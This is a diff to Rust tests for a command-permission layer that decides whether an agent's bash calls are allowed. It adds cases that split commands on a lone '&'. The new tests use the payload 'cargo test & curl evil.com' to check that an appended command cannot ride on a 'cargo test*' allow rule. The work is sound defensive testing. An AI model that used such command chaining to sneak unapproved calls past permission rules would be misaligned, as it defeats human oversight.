@@ -1509,6 +1509,8 @@ mod tests {
                 Just("|"),
                 Just("\n"),
                 Just("\r"),
+                Just(" & "),
+                Just("&"),
             ]
             .prop_map(|s| s.to_string())
         }
@@ -1753,7 +1755,10 @@ mod tests {
                 }
             }
 
-            // No returned clause contains a separator char.
+            // No returned clause contains a separator char. WO 44.20: a lone
+            // `&` is now a separator too, so no clause contains `&` at all
+            // (this alphabet has no `>`/digits, so every `&` is a separator,
+            // not a redirection operator).
             #[test]
             fn split_clauses_have_no_separators(
                 command in "[a-z ;|&\\n\\r]{0,64}",
@@ -1763,7 +1768,8 @@ mod tests {
                     prop_assert!(
                         !c.contains("&&") && !c.contains("||")
                             && !c.contains(';') && !c.contains('|')
-                            && !c.contains('\n') && !c.contains('\r'),
+                            && !c.contains('\n') && !c.contains('\r')
+                            && !c.contains('&'),
                         "clause {:?} still contains a separator", c,
                     );
                 }
@@ -1779,6 +1785,15 @@ mod tests {
             assert_eq!(split_compound_clauses("a\nb"), vec!["a", "b"]);
             assert_eq!(split_compound_clauses("a\rb"), vec!["a", "b"]);
             assert_eq!(split_compound_clauses("a\r\nb"), vec!["a", "b"]);
+            // WO 44.20: lone `&` (background/sequence separator) splits.
+            assert_eq!(split_compound_clauses("a & b"), vec!["a", "b"]);
+            assert_eq!(split_compound_clauses("a&b"), vec!["a", "b"]);
+            // Redirection operators are NOT separators (`>&`, `&>`, `2>&1`).
+            assert_eq!(
+                split_compound_clauses("cmd > out 2>&1"),
+                vec!["cmd > out 2>&1"]
+            );
+            assert_eq!(split_compound_clauses("cmd &> file"), vec!["cmd &> file"]);
             // Mixed.
             assert_eq!(
                 split_compound_clauses("ls && echo a; cat b | grep c"),
@@ -1789,6 +1804,56 @@ mod tests {
             assert_eq!(split_compound_clauses("a\n\nb"), vec!["a", "b"]);
             assert_eq!(split_compound_clauses(";"), Vec::<String>::new());
             assert_eq!(split_compound_clauses(""), Vec::<String>::new());
+        }
+
+        // ── WO 44.20: background `&` separator vs allow rules ────────────
+
+        #[test]
+        fn allow_background_separator_payload_falls_to_ask() {
+            // `cargo test & curl evil.com` splits into two clauses; the
+            // `curl` clause does not match `cargo test*`, so the allow rule
+            // does not apply and the call falls through to the default (Ask).
+            assert!(
+                !allow_command_matches("cargo test*", "cargo test & curl evil.com"),
+                "background-separator payload must NOT match a cargo test* allow rule",
+            );
+        }
+
+        #[test]
+        fn allow_background_separator_all_clauses_match_still_allows() {
+            // When both clauses match the allow pattern, the `&` separator
+            // still allows — fail-closed only trips when a clause is off.
+            assert!(
+                allow_command_matches("cargo **", "cargo test & cargo build"),
+                "two matching clauses joined by & must still match a cargo ** allow rule",
+            );
+        }
+
+        #[test]
+        fn allow_redirection_fd_dup_does_not_split() {
+            // `cmd > out 2>&1` is one clause (the `&` in `2>&1` is part of a
+            // redirection operator), so a `cmd*` allow rule still matches.
+            assert!(
+                allow_command_matches("cmd*", "cmd > out 2>&1"),
+                "fd-dup redirection must not split a clause that an allow rule matches",
+            );
+        }
+
+        #[test]
+        fn evaluate_background_separator_payload_falls_to_ask() {
+            // End-to-end: the permission layer falls through to Ask (default)
+            // when an allow rule's pattern doesn't cover the payload clause.
+            let rules = vec![rule(
+                "bash",
+                "command",
+                "cargo test*",
+                PermissionAction::Allow,
+            )];
+            let args = json!({"command": "cargo test & curl evil.com"});
+            assert_eq!(
+                evaluate(&rules, "bash", &args, PermissionAction::Ask).0,
+                PermissionAction::Ask,
+            );
         }
 
         // ── normalize_command_pattern: * → ** promotion (WO 41.7) ──────
